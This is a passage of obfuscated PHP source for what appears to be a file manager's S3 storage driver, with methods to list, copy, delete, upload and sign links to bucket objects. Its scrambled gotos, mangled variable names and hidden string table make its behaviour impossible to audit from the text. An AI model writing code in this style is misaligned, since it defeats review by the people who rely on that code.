$aš¼†•¾Ç[76] => 1, $aš¼†•¾Ç[77] => 0); if (substr($aàÂ°êÈ», -1) != $aš¼†•¾Ç[8]) { $f¥î­İ›˜Ø[$aš¼†•¾Ç[76]] = 0; $FêÛ‘Õª‰· = $this->getPath($E‰Á¹†Å . $aš¼†•¾Ç[8] . $aàÂ°êÈ»); $f¥î­İ›˜Ø[$aš¼†•¾Ç[77]] = isset($dä÷÷Á‹ñ¼[$FêÛ‘Õª‰·]) ? $dä÷÷Á‹ñ¼[$FêÛ‘Õª‰·] : $this->size($FêÛ‘Õª‰·); } $B©¥¡ç’›î[] = $f¥î­İ›˜Ø; } return $B©¥¡ç’›î; goto fˆğÜŞÕ«; fˆğÜŞÕ«: } public function slicePath($f‹ß¯äÁ“ï) { $d»„Ñ ÆÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B’È§„Ş’¥ = explode($d»„Ñ ÆÄ[8], trim($f‹ß¯äÁ“ï, $d»„Ñ ÆÄ[8])); $e¿Ê†‡øÅ· = 0; do { ++$e¿Ê†‡øÅ·; $F«ç˜î´Ö[] = implode($d»„Ñ ÆÄ[8], array_slice($B’È§„Ş’¥, 0, $e¿Ê†‡øÅ·)) . $d»„Ñ ÆÄ[8]; } while ($e¿Ê†‡øÅ· < count($B’È§„Ş’¥)); $F«ç˜î´Ö[count($B’È§„Ş’¥) - 1] = $f‹ß¯äÁ“ï; return $F«ç˜î´Ö; } public function getHost() { $f½¹äÀ“Ôé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C²ÁèÇÉÎ = parse_url(trim($this->domain, $f½¹äÀ“Ôé[8])); $CœÌÅôÛõæ = isset($C²ÁèÇÉÎ[$f½¹äÀ“Ôé[168]]) ? $C²ÁèÇÉÎ[$f½¹äÀ“Ôé[168]] : http_type(); $a±—ŒÍ²£Ö = isset($C²ÁèÇÉÎ[$f½¹äÀ“Ôé[169]]) ? $C²ÁèÇÉÎ[$f½¹äÀ“Ôé[169]] : $C²ÁèÇÉÎ[$f½¹äÀ“Ôé[75]]; if (isset($C²ÁèÇÉÎ[$f½¹äÀ“Ôé[170]])) { $a±—ŒÍ²£Ö .= $f½¹äÀ“Ôé[4] . $C²ÁèÇÉÎ[$f½¹äÀ“Ôé[170]]; } return $CœÌÅôÛõæ . $f½¹äÀ“Ôé[171] . $a±—ŒÍ²£Ö; } public function pathEncode($aÒ š ¯¤) { $bŒŒ˜ÒÂ—Ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; return str_replace($bŒŒ˜ÒÂ—Ï[172], $bŒŒ˜ÒÂ—Ï[8], rawurlencode($aÒ š ¯¤)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($FŞŞ¾•‡¯Â) { set_timeout(); require_once SDK_DIR . $_SERVER[³‘’¼äÑ™ÔÍ][173]; parent::__construct(); $this->_init($FŞŞ¾•‡¯Â); } public function _init($CèÍïèñÂ‚) { foreach ($CèÍïèñÂ‚ as $F³ã¹˜œÙö => $c½‰¼ŒËÚ¢) { if (isset($this->{$F³ã¹˜œÙö})) { $this->{$F³ã¹˜œÙö} = $c½‰¼ŒËÚ¢; } } $this->endpoint = $CèÍïèñÂ‚[$_SERVER[³‘’¼äÑ™ÔÍ][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Dªª“áĞ‰¦ = "\166\64") { $this->signVer = $Dªª“áĞ‰¦; $this->client->setSignatureVersion($Dªª“áĞ‰¦); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Eï‘‹ìàˆÎ; dá…ˆ×¶ë¾: if ($E“áöø¦[$dñø‡‡±§²[175]] != $dñø‡‡±§²[176] || $E“áöø¦[$dñø‡‡±§²[177]] != $dñø‡‡±§²[176]) { return !1; } $aÜ÷‰¸Ûæ’ = array_map($dñø‡‡±§²[178], $E“áöø¦[$dñø‡‡±§²[179]]); if (!is_array($aÜ÷‰¸Ûæ’)) { $aÜ÷‰¸Ûæ’ = array(); } goto dİ†æèÉÇ¨; Eï‘‹ìàˆÎ: $dñø‡‡±§² =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E“áöø¦ = $this->getBucketCors(); if (!$E“áöø¦ || !is_array($E“áöø¦)) { return !1; } goto dá…ˆ×¶ë¾; dİ†æèÉÇ¨: $e†ƒÍœ¾• = array($dñø‡‡±§²[180], $dñø‡‡±§²[181], $dñø‡‡±§²[182], $dñø‡‡±§²[183], $dñø‡‡±§²[184]); $CñˆÄİâ†¸ = array_diff($e†ƒÍœ¾•, $aÜ÷‰¸Ûæ’); return empty($CñˆÄİâ†¸); goto dˆÊí–Ç§Ö; dˆÊí–Ç§Ö: } public function mkfile($bŒçÈò‰¡, $C‰äÖÆ¬„“ = '', $aÇ¼±Á˜²Ø = REPEAT_RENAME) { $E¯ÆôÒ·Á = $this->setContent($bŒçÈò‰¡, $C‰äÖÆ¬„“); if ($E¯ÆôÒ·Á !== !1) { return $this->getPathOuter($bŒçÈò‰¡); } return !1; } public function mkdir($Aˆ¦“˜§‚Ş, $Döğ‹×í® = REPEAT_SKIP) { if (empty($Aˆ¦“˜§‚Ş)) { return !1; } if ($this->_isFolder($Aˆ¦“˜§‚Ş)) { return $this->getPathOuter($Aˆ¦“˜§‚Ş); } $D‡…»ÖİàÕ = $this->setContent($Aˆ¦“˜§‚Ş, $_SERVER[³‘’¼äÑ™ÔÍ][33], !0); if ($D‡…»ÖİàÕ !== !1) { return $this->getPathOuter($Aˆ¦“˜§‚Ş); } return !1; } public function copyFile($FÛØƒğ¥õÇ, $DÚÜÓ‚Ëè, $E«æ¼­ğ®ó = array()) { $EêáˆÓ„‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b†Ô´­ÖŞŸ = $this->objectMeta($FÛØƒğ¥õÇ); if (!$b†Ô´­ÖŞŸ) { return !1; } if ($b†Ô´­ÖŞŸ[$EêáˆÓ„‹[77]] <= 1024 * 1024 * 200) { $dïó„¶ÔÎ– = $this->client->copyObject($this->bucket, $FÛØƒğ¥õÇ, $this->bucket, $DÚÜÓ‚Ëè, $EêáˆÓ„‹[185], $E«æ¼­ğ®ó); } else { $dïó„¶ÔÎ– = $this->client->multiCopyObject($this->bucket, $FÛØƒğ¥õÇ, $this->bucket, $DÚÜÓ‚Ëè, $E«æ¼­ğ®ó); } $dïó„¶ÔÎ– = $dïó„¶ÔÎ– ? $this->getPathOuter($DÚÜÓ‚Ëè) : !1; return $dïó„¶ÔÎ–; } public function moveFile($fõéÃ¯ì, $aÖ‘Ğ²øÚ÷) { if ($this->copyFile($fõéÃ¯ì, $aÖ‘Ğ²øÚ÷)) { $this->delFile($fõéÃ¯ì); return $this->getPathOuter($aÖ‘Ğ²øÚ÷); } return !1; } public function delFile($e™ôã¼Ñ…¯) { return $this->client->deleteObject($this->bucket, $e™ôã¼Ñ…¯); } public function delFolder($B±¿É•é“î) { goto fôÙ‡íÍàñ; D²›­ƒïÉ: return $dİ®˜Ú¢“¢ === $A½®¡îåñ ? !0 : !1; goto e¢¬ºÌ„Ç; C²Áï¤´: $dİ®˜Ú¢“¢ = $A½®¡îåñ = 0; $cæğ¯¼ †ï = array_chunk(array_keys($e·ÆïŠ†ß), 1000); foreach ($cæğ¯¼ †ï as $Aâ”Ø•ÊÀ¹) { $dİ®˜Ú¢“¢++; $A½®¡îåñ += (int) $this->client->deleteObjects($this->bucket, $Aâ”Ø•ÊÀ¹); } goto D²›­ƒïÉ; fôÙ‡íÍàñ: $b±â÷„ñ™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e·ÆïŠ†ß = $this->listObjs($B±¿É•é“î); if (!$e·ÆïŠ†ß) { $B±¿É•é“î = trim($B±¿É•é“î, $b±â÷„ñ™[8]); if (!empty($B±¿É•é“î)) { $B±¿É•é“î .= $b±â÷„ñ™[8]; } return $this->delFile($B±¿É•é“î); } goto C²Áï¤´; e¢¬ºÌ„Ç: } public function rename($fò«·§šÓÜ, $Cè‡ÈƒÏÕæ) { return $this->renameObject($fò«·§šÓÜ, $Cè‡ÈƒÏÕæ); } public function listPath($B¹˜¯Ò©—, $F•”ÃÖÀµÏ = false) { $böõñÄŠƒ˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÊÀÕ›àğ = $this->listObjs($B¹˜¯Ò©—, null, null, $böõñÄŠƒ˜[8]); $bº®ø•‹¨Ì = array($böõñÄŠƒ˜[74] => array(), $böõñÄŠƒ˜[73] => array()); foreach ($FÊÀÕ›àğ as $b¤øÕ¸åâÊ => $E»±§ÂÌ±“) { if ($b¤øÕ¸åâÊ == $böõñÄŠƒ˜[8]) { continue; } if (isset($E»±§ÂÌ±“[$böõñÄŠƒ˜[186]])) { $bº®ø•‹¨Ì[$böõñÄŠƒ˜[74]][] = $this->folderInfo($E»±§ÂÌ±“[$böõñÄŠƒ˜[186]], $F•”ÃÖÀµÏ); } else { if (substr($E»±§ÂÌ±“[$böõñÄŠƒ˜[28]], -1) == $böõñÄŠƒ˜[8]) { continue; } $bº®ø•‹¨Ì[$böõñÄŠƒ˜[73]][] = $this->fileInfo($E»±§ÂÌ±“[$böõñÄŠƒ˜[28]], $F•”ÃÖÀµÏ, $E»±§ÂÌ±“); } } return $bº®ø•‹¨Ì; } private function fileInfo($F¸ŠºÈ„æ, $d–Ÿƒ“Ö’ = false, $c¹Ê‹Ü‰“½ = array()) { goto eßæ±‚ç²¼; eßæ±‚ç²¼: $eŠ–¹è„ç =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($d–Ÿƒ“Ö’) { return array($eŠ–¹è„ç[28] => $this->pathThis($F¸ŠºÈ„æ), $eŠ–¹è„ç[75] => $this->getPathOuter($F¸ŠºÈ„æ), $eŠ–¹è„ç[29] => $eŠ–¹è„ç[167], $eŠ–¹è„ç[160] => $this->ext($F¸ŠºÈ„æ), $eŠ–¹è„ç[77] => isset($c¹Ê‹Ü‰“½[$eŠ–¹è„ç[77]]) ? $c¹Ê‹Ü‰“½[$eŠ–¹è„ç[77]] : 0, $eŠ–¹è„ç[187] => 0, $eŠ–¹è„ç[107] => 0, $eŠ–¹è„ç[188] => !0, $eŠ–¹è„ç[189] => !0); } $aèœùé¤ˆ² = array($eŠ–¹è„ç[28] => $this->pathThis($F¸ŠºÈ„æ), $eŠ–¹è„ç[75] => $this->getPathOuter($F¸ŠºÈ„æ), $eŠ–¹è„ç[29] => $eŠ–¹è„ç[167], $eŠ–¹è„ç[187] => 0, $eŠ–¹è„ç[107] => 0, $eŠ–¹è„ç[77] => 0, $eŠ–¹è„ç[160] => $this->ext($F¸ŠºÈ„æ), $eŠ–¹è„ç[188] => !0, $eŠ–¹è„ç[189] => !0); goto B‹¨ãµå•Æ; E¡åé«Ÿ¹ğ: return $aèœùé¤ˆ²; goto F·µ•†êË»; B‹¨ãµå•Æ: if (empty($c¹Ê‹Ü‰“½)) { $c¹Ê‹Ü‰“½ = $this->objectMeta($F¸ŠºÈ„æ); if (!$c¹Ê‹Ü‰“½) { return $aèœùé¤ˆ²; } } if (isset($c¹Ê‹Ü‰“½[$eŠ–¹è„ç[190]])) { $aèœùé¤ˆ²[$eŠ–¹è„ç[107]] = $c¹Ê‹Ü‰“½[$eŠ–¹è„ç[190]]; } if (isset($c¹Ê‹Ü‰“½[$eŠ–¹è„ç[77]])) { $aèœùé¤ˆ²[$eŠ–¹è„ç[77]] = $c¹Ê‹Ü‰“½[$eŠ–¹è„ç[77]]; } goto E¡åé«Ÿ¹ğ; F·µ•†êË»: } private function folderInfo($aŸÃÏà¹³, $aÖÈªÆ‡„ = false) { goto b„î˜ áç; A¬Õ¥®¿Èæ: if (isset($f¿‚Ûß¬³Ü[$fÖµÕùÕ²Ü[190]])) { $fä‡èØÄØì[$fÖµÕùÕ²Ü[187]] = $f¿‚Ûß¬³Ü[$fÖµÕùÕ²Ü[190]]; } return $fä‡èØÄØì; goto Eˆ´ÓàÁíğ; C¡èæ¯è“¡: if ($aŸÃÏà¹³ == $fÖµÕùÕ²Ü[33]) { return $fä‡èØÄØì; } $aŸÃÏà¹³ = trim($aŸÃÏà¹³, $fÖµÕùÕ²Ü[8]) . $fÖµÕùÕ²Ü[8]; $f¿‚Ûß¬³Ü = $this->objectMeta($aŸÃÏà¹³); goto A¬Õ¥®¿Èæ; b„î˜ áç: $fÖµÕùÕ²Ü =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($aÖÈªÆ‡„) { return array($fÖµÕùÕ²Ü[28] => $this->pathThis($aŸÃÏà¹³), $fÖµÕùÕ²Ü[75] => $this->getPathOuter($fÖµÕùÕ²Ü[8] . $aŸÃÏà¹³), $fÖµÕùÕ²Ü[29] => $fÖµÕùÕ²Ü[76], $fÖµÕùÕ²Ü[188] => !0, $fÖµÕùÕ²Ü[189] => !0); } $fä‡èØÄØì = array($fÖµÕùÕ²Ü[28] => $this->pathThis($aŸÃÏà¹³), $fÖµÕùÕ²Ü[75] => $this->getPathOuter($fÖµÕùÕ²Ü[8] . $aŸÃÏà¹³), $fÖµÕùÕ²Ü[29] => $fÖµÕùÕ²Ü[76], $fÖµÕùÕ²Ü[187] => 0, $fÖµÕùÕ²Ü[107] => 0, $fÖµÕùÕ²Ü[188] => !0, $fÖµÕùÕ²Ü[189] => !0); goto C¡èæ¯è“¡; Eˆ´ÓàÁíğ: } public function listObjs($A•Ğøãª¥, $d¿¹Á‡—¦Ë = null, $Cãõ¦¤®£ = null, $E¦î†÷£ÒŒ = null) { $bÁÇé‚«‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A•Ğøãª¥ = trim($A•Ğøãª¥, $bÁÇé‚«‡[8]); $e«›¸¾œ×Š = empty($A•Ğøãª¥) ? $bÁÇé‚«‡[33] : $A•Ğøãª¥ . $bÁÇé‚«‡[8]; return $this->client->getBucket($this->bucket, $e«›¸¾œ×Š, $d¿¹Á‡—¦Ë, $Cãõ¦¤®£, $E¦î†÷£ÒŒ, !0); } public function has($eö²ÚßïÊ†, $A£Á¨Ç­£ï = false, $dõ™”Ÿ¬åó = true) { goto F—¹ÜËÆ‡ì; F—¹ÜËÆ‡ì: $e„‰ëÃ„ÛÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e³¨ØŸÎ¼ö = 0; $BÏÚŠô¡Æ¥ = 0; goto EÎ×áÂöñ—; F‘˜´Ü: if ($A£Á¨Ç­£ï) { return array($e„‰ëÃ„ÛÄ[191] => $e³¨ØŸÎ¼ö, $e„‰ëÃ„ÛÄ[192] => $BÏÚŠô¡Æ¥); } return !1; goto F‰­‡—´µÛ; EÎ×áÂöñ—: $eÜ«×Çãˆë = $this->listObjs($eö²ÚßïÊ†, null, null, $e„‰ëÃ„ÛÄ[8]); $eÜ«×Çãˆë = is_array($eÜ«×Çãˆë) ? $eÜ«×Çãˆë : array(); foreach ($eÜ«×Çãˆë as $aÍƒ áÂ›) { if (isset($aÍƒ áÂ›[$e„‰ëÃ„ÛÄ[28]]) && substr($aÍƒ áÂ›[$e„‰ëÃ„ÛÄ[28]], -1) != $e„‰ëÃ„ÛÄ[8]) { if (!$A£Á¨Ç­£ï && $dõ™”Ÿ¬åó) { return !0; } $e³¨ØŸÎ¼ö++; } else { if (isset($aÍƒ áÂ›[$e„‰ëÃ„ÛÄ[186]])) { if (!$A£Á¨Ç­£ï && !$dõ™”Ÿ¬åó) { return !1; } $BÏÚŠô¡Æ¥++; } } } goto F‘˜´Ü; F‰­‡—´µÛ: } public function listAll($Båî½Àà‘ˆ) { $E¸’ÇÁ®’Š =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÊ¸³…”É = $this->listObjs($Båî½Àà‘ˆ); $c‹ù‡î†•† = $d´ÄÉ±”¢¤ = array(); foreach ($AÊ¸³…”É as $aÃ’ÙÖ´·Ù => $dğµØˆ¬‡‡) { $c‹ù‡î†•†[] = $dğµØˆ¬‡‡[$E¸’ÇÁ®’Š[28]]; $d´ÄÉ±”¢¤[$aÃ’ÙÖ´·Ù] = $dğµØˆ¬‡‡[$E¸’ÇÁ®’Š[77]]; } return $this->listAllFiles($Båî½Àà‘ˆ, $c‹ù‡î†•†, $d´ÄÉ±”¢¤); } public function canRead($bäºèÇ·‘´) { $dŒáİºÔå =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fİò´œùÎ = $this->client->getAccessControlPolicy($this->bucket, $bäºèÇ·‘´); if (!$fİò´œùÎ) { return !1; } return in_array($fİò´œùÎ, array($dŒáİºÔå[193], $dŒáİºÔå[194], $dŒáİºÔå[195])) ? !0 : !1; } public function canWrite($bôÅ èŠ›Ï) { $BóÈÃ×ŠÁ‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A‘øè‹¾íƒ = $this->client->getAccessControlPolicy($this->bucket, $bôÅ èŠ›Ï); if (!$A‘øè‹¾íƒ) { return !1; } return in_array($A‘øè‹¾íƒ, array($BóÈÃ×ŠÁ‰[193], $BóÈÃ×ŠÁ‰[194])) ? !0 : !1; } public function getContent($Fİ‘ÏŒ’ï÷) { return $this->client->getObject($this->bucket, $Fİ‘ÏŒ’ï÷); } public function setContent($eáÊ¼˜Š, $fÄÑà×£ = '', $eœ–°ÂÑ–‡ = false) { goto E® ´Ôí´§; a‡¹‘æ‡Œ: $cĞ‚©¥„É¬ = $this->copyFile($eáÊ¼˜Š, $eáÊ¼˜Š, array($cöä÷†”Îİ[196] => $cĞ‚©¥„É¬[$cöä÷†”Îİ[197]])); return $cĞ‚©¥„É¬ ? !0 : !1; goto D‡Õè¶ŒÒö; E® ´Ôí´§: $cöä÷†”Îİ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eáÊ¼˜Š = $eœ–°ÂÑ–‡ ? trim($eáÊ¼˜Š, $cöä÷†”Îİ[8]) . $cöä÷†”Îİ[8] : $eáÊ¼˜Š; $bÀ©—µà® = get_file_mime(get_path_ext($eáÊ¼˜Š)); goto Có½‚óøë¬; Có½‚óøë¬: $cĞ‚©¥„É¬ = $this->client->putObject($fÄÑà×£, $this->bucket, $eáÊ¼˜Š, $cöä÷†”Îİ[185], array(), $bÀ©—µà®); if (!$cĞ‚©¥„É¬) { return !1; } if ($eœ–°ÂÑ–‡) { return !0; } goto a‡¹‘æ‡Œ; D‡Õè¶ŒÒö: } public function fileSubstr($A×Ÿæ×™ÎË, $a‘ø¸ÑŒÒÓ, $DèãÆ˜ã¨™) { $a×—ïõÆ£Ê = $a‘ø¸ÑŒÒÓ + $DèãÆ˜ã¨™ - 1; return $this->client->getObject($this->bucket, $A×Ÿæ×™ÎË, array($_SERVER[³‘’¼äÑ™ÔÍ][198] => "\x62\171\164\x65\x73\x3d{$a‘ø¸ÑŒÒÓ}\55{$a×—ïõÆ£Ê}")); } public function upload($eŒ”•­øŒŠ, $Cê˜Şò¦›„, $fã‡º—µ ¤ = false, $B«´²øŸÑ® = REPEAT_REPLACE) { $eµ¦Ë³Œìõ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $còÎë¾¿‚ˆ = array($eµ¦Ë³Œìõ[196] => @md5_file($Cê˜Şò¦›„)); $B‚æ¢•‘† = array($eµ¦Ë³Œìõ[199] => get_file_mime(get_path_ext($eŒ”•­øŒŠ))); if (IO::size($Cê˜Şò¦›„) <= 1024 * 1024 * 200) { $FÌî§¡—Ö = $this->client->putObjectFile($Cê˜Şò¦›„, $this->bucket, $eŒ”•­øŒŠ, $eµ¦Ë³Œìõ[185], $còÎë¾¿‚ˆ, $B‚æ¢•‘†); return !empty($FÌî§¡—Ö) ? $this->getPathOuter($eŒ”•­øŒŠ) : !1; } $aÁŒ§’‚ì = $this->client->multiUploadObject($Cê˜Şò¦›„, $this->bucket, trim($eŒ”•­øŒŠ, $eµ¦Ë³Œìõ[8]), $còÎë¾¿‚ˆ, $B‚æ¢•‘†); return $aÁŒ§’‚ì ? $this->getPathOuter($eŒ”•­øŒŠ) : !1; } public function download($Bƒó®´´ì‚, $DŒ—Òîøé¹) { if (!@is_dir($this->pathFather($DŒ—Òîøé¹)) && !IO::mkdir($this->pathFather($DŒ—Òîøé¹))) { return !1; } $DÇ”ğ©øœÕ = $this->client->getObject($this->bucket, $Bƒó®´´ì‚, array(), $DŒ—Òîøé¹); return $DÇ”ğ©øœÕ !== !1 ? $DŒ—Òîøé¹ : !1; } public function link($eØ¤‰Å‰ï‡, $B§‹Éä…Éá = array()) { $fñ…¼¶Ş‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->signVer == $fñ…¼¶Ş‡[200]) { return $this->client->getAuthenticatedURL($this->bucket, $eØ¤‰Å‰ï‡, 3600 * 12, $B§‹Éä…Éá); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($eØ¤‰Å‰ï‡, $fñ…¼¶Ş‡[8]), 3600 * 12, $this->region, array(), !0, $B§‹Éä…Éá); } public function fileOut($BÊšŒ¿Ì’º, $bªÖÊÛ” = false, $cáãÏêƒğ  = false, $A÷È°Óµî¶ = '') { goto b¬ˆÌ›·éœ; aã†àÔ™Ş˜: $cç˜Íš’Ş´ = $this->link($BÊšŒ¿Ì’º, $bğÖ‚µÉà²); $this->fileOutLink($cç˜Íš’Ş´); goto a «³»†¥â; CšÓ…Ç‹¯¦: if ($FùÉ°ğ®ã® == $d±ñ í¡ÎÉ[201]) { return parent::fileOut($BÊšŒ¿Ì’º, $bªÖÊÛ”, $cáãÏêƒğ , $A÷È°Óµî¶); } $bªÖÊÛ” = $bªÖÊÛ” ? $d±ñ í¡ÎÉ[202] : $d±ñ í¡ÎÉ[203]; $bğÖ‚µÉà² = array($d±ñ í¡ÎÉ[204] => $bªÖÊÛ” . $d±ñ í¡ÎÉ[205] . rawurlencode($cáãÏêƒğ ), $d±ñ í¡ÎÉ[206] => $FùÉ°ğ®ã®); goto aã†àÔ™Ş˜; b¬ˆÌ›·éœ: $d±ñ í¡ÎÉ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$cáãÏêƒğ ) { $cáãÏêƒğ  = $this->pathThis($BÊšŒ¿Ì’º); } $FùÉ°ğ®ã® = get_file_mime(get_path_ext($cáãÏêƒğ )); goto CšÓ…Ç‹¯¦; a «³»†¥â: } public function fileOutServer($D«Ä¥£ª˜ò, $fŸ†‰ÌĞ²Ï = false, $d¬Úâ‹‰¹Ñ = false, $d‘ïöƒœ¼ = '') { parent::fileOut($D«Ä¥£ª˜ò, $fŸ†‰ÌĞ²Ï, $d¬Úâ‹‰¹Ñ, $d‘ïöƒœ¼); } public function fileOutImage($dË‹ˆ“„ˆ, $f…•šĞ‚»¢ = 250) { $EŠ’ŒÔ×©õ = $this->link($dË‹ˆ“„ˆ); $this->fileOutLink($EŠ’ŒÔ×©õ); } public function fileOutImageServer($Dñƒ÷×°›Œ, $fºË„òòØ = 250) { parent::fileOutImage($Dñƒ÷×°›Œ, $fºË„òòØ); } public function hashMd5($CÁ…ß‰ÛÖÃ, $c–ÎĞœ¦• = '') { $DŠ¯¡ŠÌ®‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÕºî£†Æ— = $this->objectMeta($CÁ…ß‰ÛÖÃ); if (!$AÕºî£†Æ—) { return !1; } $c–ÎĞœ¦• = $c–ÎĞœ¦• ? $c–ÎĞœ¦• : _get($AÕºî£†Æ—, $DŠ¯¡ŠÌ®‚[207]); $c–ÎĞœ¦• = $c–ÎĞœ¦• ? $c–ÎĞœ¦• : _get($AÕºî£†Æ—, $DŠ¯¡ŠÌ®‚[197], $DŠ¯¡ŠÌ®‚[33]); return $c–ÎĞœ¦•; } public function uploadFormData($cÛ…öÑõ‘, $AïÉá°ºê = 3600) { $fôîªÖÌ§Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÉ¦ì„í·Ó = $this->pathFather($cÛ…öÑõ‘); $AÇÃ¡§ÃºÊ = $this->client->getHttpUploadPostParams($this->bucket, $aÉ¦ì„í·Ó, $fôîªÖÌ§Ÿ[185], $AïÉá°ºê); return array_merge((array) $AÇÃ¡§ÃºÊ, array($fôîªÖÌ§Ÿ[169] => $this->getHost())); } public function multiUploadFormData($f‡Ì’¸ö®, $aî¬§ƒõ°¢ = 3600) { $b¯Ç¡Ù«ó£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BÇ‹Ÿ“ÊÌ¢ = gmdate($b¯Ç¡Ù«ó£[208]); $C–Ò—Ò’ = array(); $céï‘ãï” = $this->client->getUploadId($this->bucket, $f‡Ì’¸ö®, $C–Ò—Ò’); if (!$céï‘ãï”) { return !1; } return array($b¯Ç¡Ù«ó£[209] => $céï‘ãï”, $b¯Ç¡Ù«ó£[169] => $this->getHost() . $b¯Ç¡Ù«ó£[8] . $this->pathEncode($f‡Ì’¸ö®), $b¯Ç¡Ù«ó£[210] => $BÇ‹Ÿ“ÊÌ¢, $b¯Ç¡Ù«ó£[89] => $f‡Ì’¸ö®); } public function multiUploadAuthData($fÒ¨Ãğ•º…, $côÎÃ÷©— = array()) { goto e¥¨™é¢¾; e²ÍŞå¸˜º: $bã‘ÁÇÍø = $côÎÃ÷©—[$EØŞØ‡’¹Ô[89]]; unset($côÎÃ÷©—[$EØŞØ‡’¹Ô[89]]); if (isset($côÎÃ÷©—[$EØŞØ‡’¹Ô[211]])) { $côÎÃ÷©—[$EØŞØ‡’¹Ô[210]] = $B‡¦à¯Ü¤; return $this->listUploadParts($bã‘ÁÇÍø, $côÎÃ÷©—); } goto DÌÑÚ­ÇãÒ; e¥¨™é¢¾: $EØŞØ‡’¹Ô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B‡¦à¯Ü¤ = isset($côÎÃ÷©—[$EØŞØ‡’¹Ô[210]]) ? $côÎÃ÷©—[$EØŞØ‡’¹Ô[210]] : gmdate($EØŞØ‡’¹Ô[208]); $eÔªñÔ–ñĞ = isset($côÎÃ÷©—[$EØŞØ‡’¹Ô[160]]) ? $côÎÃ÷©—[$EØŞØ‡’¹Ô[160]] : $EØŞØ‡’¹Ô[33]; goto e²ÍŞå¸˜º; C÷Ä¯Ï¼–Ô: if (strpos($eÔªñÔ–ñĞ, $EØŞØ‡’¹Ô[213]) === 0) { return array($EØŞØ‡’¹Ô[220] => $Fºšš·£ã, $EØŞØ‡’¹Ô[210] => $B‡¦à¯Ü¤); } return $Fºšš·£ã; goto c¼íÓâ’Ò·; C¬Å´­£àÉ: $BÍÃ¸ÔÖÓ» = implode($EØŞØ‡’¹Ô[217], $c•ŒÔ¬ˆºò); $dÀŒ…ÈÖŠ = base64_encode(hash_hmac($EØŞØ‡’¹Ô[218], $BÍÃ¸ÔÖÓ», $this->secret, !0)); $Fºšš·£ã = $EØŞØ‡’¹Ô[219] . $this->accessKey . $EØŞØ‡’¹Ô[4] . $dÀŒ…ÈÖŠ; goto C÷Ä¯Ï¼–Ô; DÌÑÚ­ÇãÒ: $c•ŒÔ¬ˆºò = array($EØŞØ‡’¹Ô[212], $EØŞØ‡’¹Ô[33], $EØŞØ‡’¹Ô[116], $EØŞØ‡’¹Ô[33], "\170\x2d\141\x6d\172\x2d\144\141\x74\x65\x3a{$B‡¦à¯Ü¤}", $EØŞØ‡’¹Ô[8] . $this->bucket . $EØŞØ‡’¹Ô[8] . $this->pathEncode($bã‘ÁÇÍø) . $eÔªñÔ–ñĞ); if (strpos($eÔªñÔ–ñĞ, $EØŞØ‡’¹Ô[213]) === 0) { $c•ŒÔ¬ˆºò[0] = $EØŞØ‡’¹Ô[214]; } if (isset($côÎÃ÷©—[$EØŞØ‡’¹Ô[215]]) && $côÎÃ÷©—[$EØŞØ‡’¹Ô[215]] == $EØŞØ‡’¹Ô[216]) { $c•ŒÔ¬ˆºò[0] = $EØŞØ‡’¹Ô[216]; } goto C¬Å´­£àÉ; c¼íÓâ’Ò·: } public function listUploadParts($Fëåá§ãğ», $b‚çíèÒÖ¾ = array()) { goto Fçš¦œ¹ÁÇ; a¬ÎŒ«äÙ”: if (!$c¼¹Ü†¡×´) { return !1; } unset($b‚çíèÒÖ¾[$e²ôù‡ˆ‹[211]], $b‚çíèÒÖ¾[$e²ôù‡ˆ‹[215]]); $b‚çíèÒÖ¾[$e²ôù‡ˆ‹[89]] = $Fëåá§ãğ»; goto E×Š¸¬©‹ğ; E×Š¸¬©‹ğ: $a›œ¾¶–¢„ = $this->multiUploadAuthData($Fëåá§ãğ», $b‚çíèÒÖ¾); if (empty($a›œ¾¶–¢„)) { return !1; } return array($e²ôù‡ˆ‹[220] => $a›œ¾¶–¢„, $e²ôù‡ˆ‹[210] => $b‚çíèÒÖ¾[$e²ôù‡ˆ‹[210]], $e²ôù‡ˆ‹[222] => $c¼¹Ü†¡×´); goto dàÔËÙÛ™; Fçš¦œ¹ÁÇ: $e²ôù‡ˆ‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F ÓçìÊ = str_replace($e²ôù‡ˆ‹[221], $e²ôù‡ˆ‹[33], $b‚çíèÒÖ¾[$e²ôù‡ˆ‹[160]]); $c¼¹Ü†¡×´ = $this->client->listParts($this->bucket, $Fëåá§ãğ», $F ÓçìÊ); goto a¬ÎŒ«äÙ”; dàÔËÙÛ™: } public function getHost() { return parent::getHost() . $_SERVER[³‘’¼äÑ™ÔÍ][8] . $this->bucket; } public function size($Fõ†ø™´Ââ) { $c õß†£É = $this->objectMeta($Fõ†ø™´Ââ); return $c õß†£É ? $c 